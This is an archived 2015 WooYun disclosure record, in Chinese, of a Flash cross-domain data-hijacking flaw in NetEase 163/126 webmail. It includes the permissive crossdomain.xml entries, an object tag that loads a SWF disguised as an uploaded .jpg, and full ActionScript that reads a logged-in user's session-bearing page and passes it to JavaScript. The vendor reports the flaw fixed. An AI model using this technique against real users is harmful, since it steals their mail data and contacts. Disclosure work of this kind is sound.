{"id": 66757, "wybug_id": "wooyun-2015-0141464", "wybug_title": "我是如何窃取已登陆用户163/126 邮件的", "wybug_corp": "网易", "wybug_author": "he1renyagao", "wybug_date": "2015-09-16 09:17", "wybug_open_date": "2015-11-04 19:32", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "默认配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-04：\t细节向公众公开  简要描述： 老问题，老漏洞，估计又要刷起这一类漏洞了 详细说明：  漏洞原理我这边就不阐述了，请移步 http://drops.wooyun.org/tips/2031 (Flash跨域数据劫持)我们看下163/126邮箱域名下crossdomain.xml 文件 \n\n开放的范围很大，也就是我们在一下域名中随便找一个可以上传文件的，且上传后文件的域名属属于一下范围内，就可以构造邮箱的CSRF漏洞<allow-access-from domain=\"*.163.com\"/><allow-access-from domain=\"*.netease.com\"/><allow-access-from domain=\"*.126.com\"/><allow-access-from domain=\"*.yeah.net\"/>接下来找到一个符合要求的上传位置  http://zmq.netease.com/  注册上传上传的文件内容是一个swf格式的代码，路径为http://zmq.netease.com/attachments/swfupload/150915114489e2fcb7ea7a2ea5.jpg利用object加载，格式为<object id=\"myObject\" width=\"100\" height=\"100\" allowscriptaccess=\"always\" type=\"application/x-shockwave-flash\" data=\"http://zmq.netease.com/attachments/swfupload/150915114489e2fcb7ea7a2ea5.jpg\"><param name=\"AllowScriptAccess\" value=\"always\"><param name=\"flashvars\" value=\"input=http://mail.163.com/entry/cgi/ntesdoor\"></object>要想构造163邮箱的CSRF，还需要一个参数SID，找到网页页面中泄露sid 的链接，http://mail.163.com/entry/cgi/ntesdoor 获取sid 之后想干啥就干啥了吧，写了一个小例子，http://1.ssrf.sinaapp.com/163.html  已登录用户访问http://1.ssrf.sinaapp.com/163.html 可列出你的通讯录   漏洞证明：  flash 的as 代码 如下 （来源http://wooyun.org/bugs/wooyun-2014-062461）package com.powerflasher.SampleApp {\timport flash.external.ExternalInterface;\timport flash.display.Sprite;\timport flash.display.Sprite;    import flash.events.Event;    import flash.net.URLLoader;    import flash.net.URLRequest;    import flash.text.TextField;    import flash.text.TextFieldAutoSize;    import flash.xml.*;    import flash.events.IOErrorEvent;\timport flash.events.*;    import flash.net.*;\t/**\t * @author User\t */  \tpublic class CrossDomainDataHijack extends Sprite {         private var loader:URLLoader;        public function CrossDomainDataHijack() {            loader = new URLLoader();            configureListeners(loader);\t\t\tvar target:String = root.loaderInfo.parameters.input;             var request:URLRequest = new URLRequest(target);            try {                loader.load(request);            } catch (error:Error) {                sendDatatoJS(\"Unable to load requested document; Error: \" + error.getStackTrace());            }        }        private function configureListeners(dispatcher:IEventDispatcher):void {            dispatcher.addEventListener(Event.COMPLETE, completeHandler);            dispatcher.addEventListener(Event.OPEN, openHandler);            dispatcher.addEventListener(ProgressEvent.PROGRESS, progressHandler);            dispatcher.addEventListener(SecurityErrorEvent.SECURITY_ERROR, securityErrorHandler);            dispatcher.addEventListener(HTTPStatusEvent.HTTP_STATUS, httpStatusHandler);            dispatcher.addEventListener(IOErrorEvent.IO_ERROR, ioErrorHandler);        }        private function completeHandler(event:Event):void {            var loader:URLLoader = URLLoader(event.target);            //trace(\"completeHandler: \" + loader.data);    \t\tsendDatatoJS(\"completeHandler: \" + loader.data);        }        private function openHandler(event:Event):void {            //trace(\"openHandler: \" + event);\t\t\tsendDatatoJS(\"openHandler: \" + event);        }        private function progressHandler(event:ProgressEvent):void {            //trace(\"progressHandler loaded:\" + event.bytesLoaded + \" total: \" + event.bytesTotal);\t\t\tsendDatatoJS(\"progressHandler loaded:\" + event.bytesLoaded + \" total: \" + event.bytesTotal);        }        private function securityErrorHandler(event:SecurityErrorEvent):void {            //trace(\"securityErrorHandler: \" + event);\t\t\tsendDatatoJS(\"securityErrorHandler: \" + event);        }        private function httpStatusHandler(event:HTTPStatusEvent):void {            //trace(\"httpStatusHandler: \" + event);\t\t\tsendDatatoJS(\"httpStatusHandler: \" + event);        }        private function ioErrorHandler(event:IOErrorEvent):void {            //trace(\"ioErrorHandler: \" + event);\t\t\tsendDatatoJS(\"ioErrorHandler: \" + event);        } \t\tprivate function sendDatatoJS(data:String):void{            trace(data);\t\t\tExternalInterface.call(\"sendToJavaScript\", data);\t\t}    }  }   修复方案：  如果crossdomain.xml 的问题没有改善，估计很难预防，范围太大，上传不可控，甚至有些网站也可通过ssrf 加载远程图片形成，就不需要上传文件了。   版权声明：转载请注明来源 he1renyagao@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-09-20 19:31 厂商回复： 漏洞已修复，感谢您对网易的关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-16 09:20 |    \t\t鬼见愁 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 挖洞之神)\t\t \n  尼玛是不是任意账号    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}